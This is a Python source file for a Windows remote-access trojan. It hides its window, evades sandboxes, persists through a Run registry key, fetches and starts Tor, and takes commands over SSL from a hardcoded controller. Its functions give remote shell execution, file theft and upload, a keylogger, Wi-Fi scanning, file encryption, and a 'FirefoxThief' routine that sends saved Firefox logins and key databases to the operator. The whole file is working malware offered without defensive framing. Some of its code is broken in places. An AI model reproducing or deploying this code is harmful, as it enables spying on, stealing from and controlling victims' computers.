import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, simplejson, thread, zipfile
import inspect, urllib2, os.path, base64, getpass, urllib, time, pyHook, pythoncom, time, subprocess
import win32console, win32gui
from subprocess import Popen, PIPE, STDOUT
from Crypto.Cipher import AES
from WindowsWifi import getWirelessInterfaces, getWirelessAvailableNetworkList
from _winreg import *

def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True
hide()

##### evade std sandbox

state_left = win32api.GetKeyState(0x01)
while True:
    a = win32api.GetKeyState(0x01)
    if a != state_left:
        state_left = a
        if a >= 0:
            time.sleep(15)
            break
    time.sleep(0.1)

class PKCS7Encoder():
    class InvalidBlockSizeError(Exception):
        """Raised for invalid block sizes"""
        pass

    def __init__(self, block_size=16):
        if block_size < 2 or block_size > 255:
            raise PKCS7Encoder.InvalidBlockSizeError('The block size must be ' \
                    'between 2 and 255, inclusive')
        self.block_size = block_size

    def encode(self, text):
        text_length = len(text)
        amount_to_pad = self.block_size - (text_length % self.block_size)
        if amount_to_pad == 0:
            amount_to_pad = self.block_size
        pad = chr(amount_to_pad)
        return text + pad * amount_to_pad

    def decode(self, text):
        pad = ord(text[-1])
        return text[:-pad]


encoder = PKCS7Encoder()
#host = 'hcjczulezpxxfw2n.onion'
host = '192.168.0.104'
cType = "client000-crypto" #client Type
global log1

######### virtus-total check
def VTcheck(VTKey)
    VTurl = "https://www.virustotal.com/vtapi/v2/file/report"
    with open(os.path.basename(__file__) , "rb") as thisFile:
        HF = hashlib.sha256()
        HF.update(thisFile.read())
        thisHash = HF.hexdigest()
    parameters = {"resource": thisHash, "apikey": VTKey}
    jReport = urllib2.urlopen(urllib2.Request(VTurl, urllib.urlencode(parameters))).read()
    rPositives = simplejson.loads(jReport).get("positives",{})
    #rPositives = 0 #just for testing
    if str(rPositives) != "{}":
        if rPositives == 0:
            return ("VTcheck: safe | scanned \n  |--- sha256: " + thisHash)
        elif 0 < rPositives:
            return ("VTcheck: not-safe | scanned: "+str(rPositives) + "\n  |--- sha256: " + thisHash)
        else:
            return ("VTcheck: error occurred")
    else:
        return ("VTcheck: probably safe | not scanned \n|--- sha256: " + thisHash)
# sysinfo
uname = platform.uname()[0:3]

def DownHTTP(url,fileName):
    fileHTTP = urllib.URLopener()
    if fileName == "":
        fileHTTP.retrieve(url,url.split("/")[len(url.split("/"))-1])
    else:
        fileHTTP.retrieve(url,fileName)

###### setup  EDIT
def setup():
    oldpath = os.getcwd()
    newpath = os.getenv("appdata")
    if os.path.exists(newpath):
        os.chdir(newpath)
        if not os.path.exists("EditMe"):
            os.makedirs("EditMe")
            os.chdir("EditMe")
            from shutil import copyfile
            copyfile(oldpath+r'\EditMe.exe', "EditMe.exe") #Edit me
            copyfile(oldpath+r"\msvcr100.dll", "msvcr100.dll")
    else:
            os.chdir("EditMe")
            from shutil import copyfile
            copyfile(oldpath+"'\'EditMe", "EditMe.exe") #Edit me
            copyfile(oldpath+"'\'msvcr100.dll", "msvcr100.dll")

print os.getcwd()
def DownTor():
    if not os.path.exists("Tor"):
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
        response = opener.open('https://www.torproject.org/dist/torbrowser/6.0.4/tor-win32-0.2.8.6.zip')
        f = open("tor.zip", "wb")
        f.write(response.read())
        f.close()
        time.sleep(0.1)
        with zipfile.ZipFile('tor.zip', "r") as z:
            z.extractall(os.getenv("appdata")+r"\EditMe")
        T1 = subprocess.Popen([os.getenv("appdata")+r"\EditMe\Tor\tor.exe"]).pid
        return " T1"
    else:
        T2 = subprocess.Popen([os.getenv("appdata")+r"\Eduroam\Tor\tor.exe"]).pid
        return " T2"

######## on 1st run
setup()
staTor = DownTor()

# getting target IP
def myIP():
    try:
        myIP = urllib2.urlopen("http://myexternalip.com/raw").read()[0:-1]
    except:
        myIP = "Error! Can't check IP!"

def RecvData():
    temp = ssl_sock.read()
    outData = ""
    while temp != "SEND":
        outData += temp
        temp = ssl_sock.read()
    return outData

def FindFile(path, fileType):
    FileList = open("list_"+fileType+".txt", "wa")
    for root, dirs, files in os.walk(path):
        for File in files:
             if File.endswith("."+fileType):
                 FileList.write(os.path.join(root, File))
    FileList.close()
    return "--> list_"+fileType+".txt"

# autostart for Windows
def WindowsAutoStart():
    try:
        fp="C:\Python27\Scripts\dist\Windows-client.exe"
        keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change= OpenKey(HKEY_CURRENT_USER, keyVal,0,KEY_ALL_ACCESS)
        SetValueEx(key2change, "ChangeMe",0,REG_SZ, fp)
        return "ok"
    except:
        return "error"

def ScanWIFI(card):
    networks = getWirelessAvailableNetworkList(card)
    for network in networks:
            SendData(network)
    SendData("ScanWIFI-finished")

def OnKeyboardEvent(event):
    if runHook == 1:
        log1.write("WindowName:"+str(event.WindowName)+"||"+chr(event.Ascii)+"\n")
    else:
        pass
    return True

global HKthread
global hookman
hookman = pyHook.HookManager()
HKthread = thread
HKstat = "OFF"

def WindowsHOOKER(threadName, running):
    hookman.KeyDown = OnKeyboardEvent
    hookman.HookKeyboard()
    while runHook:
        pythoncom.PumpWaitingMessages()
        time.sleep(0.1)

def WindowsHOOK(status,namefile):
    global HKstat
    if status == "check":
        return HKstat
    elif status == "ON":
        if status == HKstat:
            report = "Already running"
            return report
        else:
            try:
                global runHook
                runHook = 1
                HKthread.start_new_thread(WindowsHOOKER, ("HK-1",1))
                global log1
                log1 = open(namefile, 'w')
                HKstat = "ON"
                return HKstat
            except:
                HKstat = "Error: unable to start thread"
                return HKstat
    elif status == "OFF":
        if status == HKstat:
            report = "Already stopped"
            return report
        else:
            try:
                runHook = 0
                time.sleep(0.1)
                log1.close()
                HKstat = "OFF"
                return HKstat
            except:
                statReturn = "Something went wrong, HKstat= " + HKstat
                return statReturn
    else:
        statReturn = "Something went wrong, HKstat= " + HKstat
        return statReturn

def FirefoxThief():
    if platform.system() == "Windows":
        SendData("Ok: Windows supported")
        maindir = os.getenv("appdata")
        if os.path.isdir(maindir+"\\Mozilla\\Firefox") == True:
            os.chdir(maindir+"\\Mozilla\\Firefox")
            SendData(EXEC("dir"))
            newDir = RecvData()
            UploadFILE("profiles.ini")
            os.chdir(maindir+'\\Mozilla\\Firefox\\'+newDir)
            SendData(EXEC("dir"))
            newDir2 = RecvData()
            os.chdir(maindir+"\\Mozilla\\Firefox\\"+newDir+"\\"+newDir2)
            UploadFILE("cert8.db")
            UploadFILE("key3.db")
            UploadFILE("logins.json")
        else:
            SendData("Error: Firefox directory not found!")
    else:
        SendData("Error: not Windows, not supported!")

def DKey(primitiveKey, salt):
    dk = hashlib.pbkdf2_hmac('sha256', primitiveKey, salt, 500000)
    return dk

def Encrypt(fileToProtect, cipher, key, IV):
    try:
        with open(fileToProtect, 'rb') as inFile, open(fileToProtect + '.enc', 'wa') as outFile:
            clearData = inFile.read()
            cryptData = cipher.encrypt(encoder.encode(clearData))
            outFile.write(cryptData)
        inFile.close()
        outFile.close()
        SendData('############################ Encrption Success')
        SendData('--> original file: ' + str(fileToProtect))
        SendData('--> protected file: ' + str(fileToProtect) + '.enc')
        SendData('HEX: ' + str(CheckHash(fileToProtect + '.enc', key, IV)))
        SendData('HashKEY: ' + base64.b64encode(DKey(key, IV)))
        SendData('----------------------------------------------')
        SendData('END')
    except:
        SendData('############################ Encrption Failed')
        if os.path.isfile(fileToProtect + '.enc') == True:
            os.remove(fileToProtect + '.enc')
            SendData('Files deleted!')
            SendData('END')
        else:
            SendData('--> no file encrypted')
            SendData('----------------------------------------------')
            SendData('END')

def Decrypt(fileProtected, cipher, digest, key, IV):
    fileToDeProtect = fileProtected.split('.')[0] + "." + fileProtected.split('.')[1] + ".dec"
    try:
        if hmac.compare_digest(CheckHash(fileProtected, key, IV), digest) == True:
            with open(fileProtected, 'rb') as inFile, open(fileToDeProtect, 'wa') as outFile:
                cryptData = inFile.read()
                clearData = cipher.decrypt(cryptData)
                cleanData = encoder.decode(clearData)
                outFile.write(cleanData)
            inFile.close()
            outFile.close()
        else:
            raise ValueError ('Data Not Secure')
        SendData('############################ Decrption Success')
        SendData('--> original file: ' + fileProtected)
        SendData('--> protected file: ' + fileToDeProtect)
        SendData('HashKEY: ' + base64.b64encode(DKey(key, IV)))
        SendData('HASH: Verified')
        SendData('----------------------------------------------')
        SendData('END')
    except:
        SendData('############################ Decrption Failed')
        SendData('Removing files!')
        if os.path.isfile(fileProtected ) == True:
            os.remove(fileProtected)
            SendData('File protected deleted')
        if os.path.isfile(fileToDeProtect) == True:
            os.remove(fileToDeProtect)
            SendData('File to de-protect deleted')
        else:
            SendData('--> no file here')
            SendData('----------------------------------------------')
            SendData('END')

def CheckHash(fileName, key, IV):
    hasher = hmac.new(DKey(key, IV),'',hashlib.sha256)
    with open(fileName, 'rb') as inFile:
        buf = inFile.read(2048)
        hasher.update(buf)
    return base64.b64encode(hasher.digest())

def SendData(inText):
    ssl_sock.write(inText)
    ssl_sock.write("CEND")

def EXEC(cmd):
    p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
    return p.stdout.read()

def UploadFILE(fileName):
    fileUP = open(fileName, 'rb')
    SendData(str(os.path.getsize(fileName)))
    while 1:
        tempData = fileUP.read()
        if tempData == '':
            break
        else:
            SendData(tempData)
    fileUP.close()
    SendData("CUF") #Client Upload Finished

def DownloadFILE(fileName):
    fileDOWN = open(fileName, 'w')
    while 1:
        temp = RecvData()
        if temp == 'SUF':
            break
        else:
            fileDOWN.write(temp)
    fileDOWN.close()
    SendData("CDF")

certificate = """-----BEGIN CERTIFICATE-----
MIICLTCCAZYCCQC2RaEC78ngmjANBgkqhkiG9w0BAQsFADBbMQswCQYDVQQGEwJO
TzEOMAwGA1UECAwFT25pb24xCzAJBgNVBAcMAk5vMQ4wDAYDVQQKDAVPbmlvbjEf
MB0GA1UEAwwWbDdzajZjN3pxZ211Y2syZC5vbmlvbjAeFw0xNjA5MjUyMDM3MTVa
Fw0xNzA5MjUyMDM3MTVaMFsxCzAJBgNVBAYTAk5PMQ4wDAYDVQQIDAVPbmlvbjEL
MAkGA1UEBwwCTm8xDjAMBgNVBAoMBU9uaW9uMR8wHQYDVQQDDBZsN3NqNmM3enFn
bXVjazJkLm9uaW9uMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDI2S+oo8Mm
cSc4KD86pVKguyPUrI2/6RfMXeFnywD+mQ1emOUvYI+2850MB0LdOP+w8JQ0niA2
DsjGWMsHzhQysRBCu7nHg0ZXQmvmORlOME4fPwxp/Ldj+//Uc5zfEipqTU5jlDEf
CeOWuNyN4kKrYDPQkoAcCzoIoF1a4A/jfQIDAQABMA0GCSqGSIb3DQEBCwUAA4GB
AAlb0mjCpjs5cWAavJFLhMb9JH9+q4SjUNwu57opwatbQMi0W9VmBkUeUbXJVwSz
VXOz5wJtgCYpqQQ2zeheecQSed4oJK0lBPDsq9NtiYlb1piAyvIKeTnlKFzChcsx
dDtATixgDNMqBONRwk5G0g6rLFrsf86jjUbtPBQqReHl
-----END CERTIFICATE-----"""

CH = hashlib.sha256()
CH.update(certificate)
certificateHASH = CH.digest()

try:
    if os.path.isfile("certificate.pem")==True:
        with open("certificate.pem" , "rb+") as inCert:
            Cin = hashlib.sha256()
            Cin.update(inCert.read())
            CinH = Cin.digest()
        if hmac.compare_digest(certificateHASH, CinH):
            print("Cert ok")
    else:
        with open("certificate.pem", "w") as out:
            out.write(certificate)
            out.close()
            print("Cert generated")
except:
    pass

sock = socks.socksocket()
#sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
while 1:
    time.sleep(10)
    try:
        sock.connect((host,5555))
        break
    except:
        pass

ssl_sock = ssl.wrap_socket(sock, cert_reqs=ssl.CERT_NONE)

print repr(ssl_sock.getpeername())
print ssl_sock.cipher()
infosServer = ssl_sock.getpeercert()
#ssl.match_hostname(infosServer,host)
SendData(cType)

while 1:
    inText = RecvData()
    if inText.startswith("download"):
        UploadFILE(inText.split(" ")[1])
    elif inText == "info":
        SendData(str(uname))
        SendData('ip:'+myIP())
        SendData(VTcheck(inText.split(":")[1]))
        SendData("end-info")
    elif inText.startswith("hook"):
        if len(inText.split(':')) == 3:
            hookstat = WindowsHOOK(inText.split(':')[1],inText.split(':')[2])
            SendData(hookstat)
        else:
            hookstat = WindowsHOOK(inText.split(':')[1],"")
            SendData(hookstat)
    elif inText.startswith("set"):
        if inText.split(":")[1]== "autostart":
            if platform.system() == "Windows":
                SendData("WindowsAutoStart: "+WindowsAutoStart())
            else: # at the moment os x not supported
                SendData("Not ruuning on Linux/Mac system")
        else:
            SendData("usage: set:autostart")
            pass
    elif inText.startswith("upload"):
        DownloadFILE(inText.split(" ")[1])
    elif inText == "alive":
        SendData(cType+" :: alive")
    elif inText == "terminate":
        ssl_sock.close()
        sys.exit(0)
    elif inText.startswith("hook"):
        SendData("Error: platform not supported!")
    elif inText == "get-inferfaces":
        try:
            SendData(str(getWirelessInterfaces()))
        except Exception:
            SendData("No wifi card here")
    elif inText.startswith("ScanWIFI"):
        ScanWIFI(inText.split(":")[1])
    elif inText.startswith('protect'):
        if inText.split(':')[1] == 'enc':
            fileToProtect = inText.split(':')[2]
            IV = os.urandom(16)
            key = os.urandom(32)
            SendData('IV: ' + base64.b64encode(IV))
            SendData('key: '+ base64.b64encode(key))
            cipher = AES.new(key, AES.MODE_CBC, IV)
            Encrypt(fileToProtect, cipher, key, IV)
        elif inText.split(':')[1] == 'dec':
            fileToDeProtect = inText.split(':')[2]
            IV = base64.b64decode(inText.split(':')[3])
            key = base64.b64decode(inText.split(':')[4])
            HEX = inText.split(':')[5]
            cipher = AES.new(key, AES.MODE_CBC, IV)
            Decrypt(fileToDeProtect, cipher, HEX, key, IV)
    elif inText.startswith("find"):
        if len(inText.split("|")) == 3:
            listFile = FindFile(inText.split("|")[1],inText.split("|")[2])
            SendData(listFile)
        else:
            SendData("usage: find|path|type")
    elif inText.startswith("exec"):
        outEXEC = EXEC(inText.split(":")[1])
        SendData(outEXEC)
    elif inText.startswith("downhttp"):
        try:
            if len(inText.split("|")) == 3:
                DownHTTP(inText.split("|")[1],inText.split("|")[2])
                SendData("Download complete!")
            elif len(inText.split("|")) == 2:
                DownHTTP(inText.split("|")[1],"")
                SendData("Download complete!")
            else:
                SendData("Error! \n usage: downhttp|url|save.type")
        except IOError as err:
            SendData("Error "+str(err))
    elif inText == "FirefoxThief":
        #SendData("Error: function not supported")
        FirefoxThief()
    else:
        print '[inText] ' + inText
        SendData(inText)
